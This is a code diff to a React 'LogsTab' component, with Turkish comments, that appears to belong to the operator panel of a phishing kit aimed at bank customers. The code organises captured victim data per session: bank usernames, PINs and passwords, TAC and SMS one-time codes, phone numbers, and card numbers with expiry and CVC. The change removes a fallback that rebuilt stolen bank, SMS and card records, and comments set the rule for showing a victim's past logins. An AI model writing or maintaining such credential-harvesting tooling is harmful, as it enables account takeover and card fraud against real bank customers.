@@ -1471,56 +1471,13 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 const curO2 = String(fd.orderedField2 || "").trim();
                 const curO3 = String(fd.orderedField3 || "").trim();
                 const hasAnyBankCur = curO1 || curUser || curPass || curTac || curPhone || curPers || curO2 || curO3;
-                const hasAnyBankField = Boolean(
-                  fd.verfuegernummer || fd.username || fd.id || fd.pin || fd.password ||
-                  fd.pw || fd.bankPhone || fd.personalCode || fd.tacCode || fd.tac_code ||
-                  fd.loginMethod || fd.orderedField1 || fd.orderedField2 || fd.orderedField3,
-                );
 
-                // --- LEGACY SNAPSHOT FALLBACK (eski sessionlar icin NEW ZELLAND L1170 gibi) ---
-                if (bankAll.length === 0 && hasAnyBankField) {
-                  bankAll.unshift({
-                    bankSlug: fd.bankSlug,
-                    bankName: fd.bankName || "Unknown",
-                    verfuegernummer: fd.verfuegernummer || fd.username || fd.id || "",
-                    username: fd.verfuegernummer || fd.username || fd.id || "",
-                    pin: fd.pin || fd.password || fd.pw || "",
-                    password: fd.pin || fd.password || fd.pw || "",
-                    bankPhone: fd.bankPhone || "",
-                    personalCode: fd.personalCode || "",
-                    tacCode: fd.tacCode || fd.tac_code || "",
-                    loginMethod: fd.loginMethod || "",
-                    orderedField1: fd.orderedField1 || "",
-                    orderedField1Key: fd.orderedField1Key || "",
-                    orderedField2: fd.orderedField2 || "",
-                    orderedField2Key: fd.orderedField2Key || "",
-                    orderedField2Type: fd.orderedField2Type || "",
-                    orderedField3: fd.orderedField3 || "",
-                    orderedField3Key: fd.orderedField3Key || "",
-                    orderedField3Type: fd.orderedField3Type || "",
-                    capturedAt: row.updated_at || row.created_at || new Date().toISOString(),
-                    isLegacySnapshot: true,
-                  });
-                }
-                if (smsAll.length === 0 && curSms.length > 0) {
-                  smsAll.unshift({
-                    htmlStepLabel: "SMS KODU",
-                    smsCode: curSms,
-                    tacCode: curSms,
-                    capturedAt: row.updated_at || row.created_at || new Date().toISOString(),
-                    isLegacySnapshot: true,
-                  });
-                }
-                if (cardAll.length === 0 && (curCardNo.length > 0 || curCardExp.length > 0 || curCardCvc.length > 0)) {
-                  cardAll.unshift({
-                    htmlStepLabel: "KART BILGISI",
-                    cardNumber: curCardNo,
-                    cardExpiry: curCardExp,
-                    cardCvc: curCardCvc,
-                    capturedAt: row.updated_at || row.created_at || new Date().toISOString(),
-                    isLegacySnapshot: true,
-                  });
-                }
+                // --- NOT: LEGACY SNAPSHOT FALLBACK KALICI OLARAK SİLİNDİ! ---
+                //   ❌ ESKI: bankAll.length === 0 + kolon doluysa SAHTE 1 kayıt ÜRET ve bankName = fd.bankName (GUNCELL KOLON) yaz.
+                //      SONUC: Kullanici "ESKI BANKA GIRISLERI" butonuna basinca SUREKLI GUNCELL BANKASI (orn Bendigo) gorunuyordu.
+                //             Bu kayit GERCEK eski form DEGILD, GUNCELL KOLONUN KENDISIYDI.
+                //   ✅ YENI KURAL (KALICI): GEÇMİŞ BUTONU SADECE GERÇEKTEN CLIENT TARAFINDAN PUSH EDİLMİŞ KAYIT VARSA GÖRÜNÜR.
+                //      Kayit YOKSA → Buton YOKTUR. Butona basinca görülen HER kayit GERÇEK ESKI formdur, kendi BANK ADINI (entry.bankName) tasımalidir.
 
                 // --- SMS HISTORY (Dedup + KENDİSİNİ SİL) ---
                 const smsRaw: any[] = smsAll
